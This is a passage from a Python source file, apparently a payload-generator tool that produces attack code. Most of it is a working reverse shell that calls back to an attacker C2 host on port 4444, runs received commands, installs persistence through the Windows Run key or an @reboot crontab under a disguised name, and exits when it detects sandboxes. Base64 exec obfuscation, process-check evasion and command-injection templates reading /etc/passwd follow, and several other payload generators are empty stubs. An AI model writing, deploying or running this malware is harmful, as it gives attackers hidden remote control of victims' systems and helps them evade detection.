            # Receive data
            data = b""
            while len(data) < length:
                chunk = self.socket.recv(length - len(data))
                if not chunk:
                    break
                data += chunk
            
            # Decompress
            decompressed = zlib.decompress(data).decode()
            
            # Decrypt if needed
            if decrypt and self.cipher:
                decompressed = self.cipher.decrypt(decompressed.encode()).decode()
            
            return decompressed
            
        except Exception as e:
            print(f"[x] Receive failed: {e}")
            return ""
    
    def execute_command(self, command: str) -> str:
        """Execute command and return output."""
        try:
            if command.strip().lower() in ['exit', 'quit']:
                return "SHELL_EXIT"
            
            # Handle built-in commands
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    return f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    return f"cd failed: {e}"
            
            # Execute system command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=30)
            
            output = stdout
            if stderr:
                output += f"\\nERROR: {stderr}"
            
            return output or "Command executed (no output)"
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timed out"
        except Exception as e:
            return f"Execution error: {e}"
    
    def start_shell(self):
        """Start interactive shell session."""
        if not self.establish_connection():
            return
        
        # Setup encryption
        self.setup_encryption()
        
        # Send initial system info
        try:
            import platform
            system_info = {
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'user': os.getenv('USER', 'unknown'),
                'cwd': os.getcwd(),
                'python_version': sys.version
            }
            
            info_str = f"[+] Shell established\\n"
            for key, value in system_info.items():
                info_str += f"{key}: {value}\\n"
            
            self.send_data(info_str, encrypt=True)
            
        except Exception as e:
            self.send_data(f"System info error: {e}")
        
        # Main shell loop
        while True:
            try:
                # Receive command
                command = self.receive_data(decrypt=True)
                if not command:
                    break
                
                # Execute command
                output = self.execute_command(command)
                
                if output == "SHELL_EXIT":
                    break
                
                # Send result
                self.send_data(output, encrypt=True)
                
            except Exception as e:
                try:
                    self.send_data(f"Shell error: {e}")
                except:
                    break
        
        # Cleanup
        try:
            self.socket.close()
        except:
            pass
    
    def persistence_mechanism(self):
        """Install persistence mechanism."""
        try:
            import tempfile
            import shutil
            
            # Copy self to temp directory
            script_path = os.path.abspath(__file__)
            temp_path = os.path.join(tempfile.gettempdir(), 'system_update.py')
            shutil.copy2(script_path, temp_path)
            
            # Add to startup (methods vary by OS)
            if os.name == 'nt':  # Windows
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                   0, winreg.KEY_ALL_ACCESS)
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
                                f'python "{temp_path}"')
                winreg.CloseKey(key)
                
            else:  # Unix-like
                cron_job = f"@reboot python3 {temp_path}"
                os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
            
            return True
            
        except Exception as e:
            print(f"[x] Persistence installation failed: {e}")
            return False


# Anti-analysis and evasion techniques
def evade_detection():
    """Implement basic evasion techniques."""
    
    # Sleep to evade sandboxes
    time.sleep(60)
    
    # Check for analysis environment indicators
    analysis_indicators = [
        'VMware', 'VirtualBox', 'QEMU', 'Xen',  # VMs
        'analysis', 'sandbox', 'malware',        # Analysis tools
        'wireshark', 'procmon', 'regmon'         # Monitoring tools
    ]
    
    # Check running processes
    try:
        processes = os.popen('tasklist' if os.name == 'nt' else 'ps aux').read().lower()
        for indicator in analysis_indicators:
            if indicator.lower() in processes:
                print(f"[!] Analysis environment detected: {indicator}")
                sys.exit(0)
    except:
        pass

# Main execution
if __name__ == "__main__":
    # Evasion check
    evade_detection()
    
    # Configuration
    ATTACKER_HOST = "192.168.1.100"  # Replace with actual C2 server
    ATTACKER_PORT = 4444
    
    try:
        shell = AdvancedReverseShell(ATTACKER_HOST, ATTACKER_PORT)
        
        # Install persistence if possible
        if shell.persistence_mechanism():
            print("[+] Persistence installed")
        
        # Start shell
        shell.start_shell()
        
    except Exception as e:
        print(f"[x] Shell execution failed: {e}")
        sys.exit(1)'''
        
        return CodeSnippet(
            title=f"Reverse Shell - {tool_name}",
            description=f"Reverse shell payload for {tool_name} remote access",
            language=ProgrammingLanguage.PYTHON,
            payload_type=PayloadType.REVERSE_SHELL,
            complexity=complexity,
            code=code,
            explanation="Establishes a reverse connection from target to attacker, providing remote shell access with optional encryption and persistence mechanisms.",
            risk_level="critical",
            prerequisites=[
                "Network connectivity to attacker system",
                "Python execution capability on target",
                "Firewall egress rules allowing outbound connections"
            ],
            evasion_techniques=[
                "Encrypted communication channel",
                "Compression to reduce network footprint", 
                "Anti-analysis environment detection",
                "Persistence mechanism installation",
                "Connection retry with exponential backoff"
            ] if complexity != PayloadComplexity.BASIC else [],
            mitigation_notes=[
                "Monitor outbound network connections",
                "Implement application execution controls",
                "Use network segmentation",
                "Deploy behavioral analysis tools"
            ]
        )
    
    # Additional generator methods would continue here...
    # For brevity, I'll add placeholder methods for the remaining payload types
    
    def _generate_data_exfiltration(self, tool_name: str, complexity: PayloadComplexity) -> CodeSnippet:
        """Generate data exfiltration payload."""
        # Implementation would generate data exfiltration code
        pass
    
    def _generate_reconnaissance(self, tool_name: str, complexity: PayloadComplexity) -> CodeSnippet:
        """Generate reconnaissance payload."""
        # Implementation would generate reconnaissance code
        pass
    
    def _generate_privilege_escalation(self, tool_name: str, complexity: PayloadComplexity) -> CodeSnippet:
        """Generate privilege escalation payload."""
        # Implementation would generate privilege escalation code
        pass
    
    def _generate_persistence(self, tool_name: str, complexity: PayloadComplexity) -> CodeSnippet:
        """Generate persistence payload."""
        # Implementation would generate persistence code  
        pass
    
    def _generate_xss(self, tool_name: str, complexity: PayloadComplexity) -> CodeSnippet:
        """Generate XSS payload."""
        # Implementation would generate XSS code
        pass
    
    def _generate_attack_stage(self, vector: AttackVector, stage_num: int) -> str:
        """Generate code for a specific attack stage."""
        return f"""
# Stage {stage_num}: {vector.description}
# Severity: {vector.severity.value}
# Access Required: {vector.required_access.value}

def stage_{stage_num}_attack():
    \"\"\"Execute stage {stage_num} of the attack chain.\"\"\"
    
    print(f"[+] Starting stage {stage_num}: {vector.description}")
    
    # Stage-specific attack code would go here
    # This is a simplified example
    
    try:
        # Simulate attack execution
        result = execute_attack_vector("{vector.vector_type}")
        if result:
            print(f"[!] Stage {stage_num} successful")
            return True
        else:
            print(f"[x] Stage {stage_num} failed")
            return False
    except Exception as e:
        print(f"[x] Stage {stage_num} error: {{e}}")
        return False

def execute_attack_vector(vector_type: str):
    \"\"\"Execute specific attack vector.\"\"\"
    # Implementation would depend on vector type
    return True
"""
    
    def _apply_obfuscation(self, code: str, language: ProgrammingLanguage, level: str) -> str:
        """Apply obfuscation to code."""
        if level == "light":
            # Simple variable name obfuscation
            obfuscated = code.replace("password", "p4ssw0rd")
            obfuscated = obfuscated.replace("admin", "4dm1n")
            return obfuscated
        elif level == "heavy":
            # More complex obfuscation (simplified example)
            import base64
            encoded = base64.b64encode(code.encode()).decode()
            return f"import base64; exec(base64.b64decode('{encoded}').decode())"
        
        return code
    
    def _apply_evasion_technique(self, code: str, language: ProgrammingLanguage, technique: str) -> str:
        """Apply specific evasion technique to code."""
        if technique == "time_delay":
            return f"import time; time.sleep(5)\n{code}"
        elif technique == "process_check":
            evasion_code = """
import psutil
# Check for analysis processes
analysis_procs = ['procmon', 'wireshark', 'tcpdump']
for proc in psutil.process_iter(['name']):
    if proc.info['name'].lower() in analysis_procs:
        exit()
"""
            return f"{evasion_code}\n{code}"
        
        return code
    
    def _initialize_templates(self):
        """Initialize payload templates."""
        self.payload_templates = {
            PayloadType.COMMAND_INJECTION: {
                "basic": "; cat /etc/passwd",
                "intermediate": "; $(cat /etc/passwd)",
                "advanced": "; python -c 'import os; os.system(\"cat /etc/passwd\")'"
            }
            # Additional templates would be added here
        }
    
    def _initialize_evasion_patterns(self):
        """Initialize evasion patterns for different payload types."""
        self.evasion_patterns = {
            PayloadType.COMMAND_INJECTION: [
                "Character encoding", "Command chaining", "Variable expansion"
            ],
            PayloadType.SQL_INJECTION: [
                "Comment injection", "Union-based extraction", "Time-based blind"
            ]
            # Additional patterns would be added here
        } 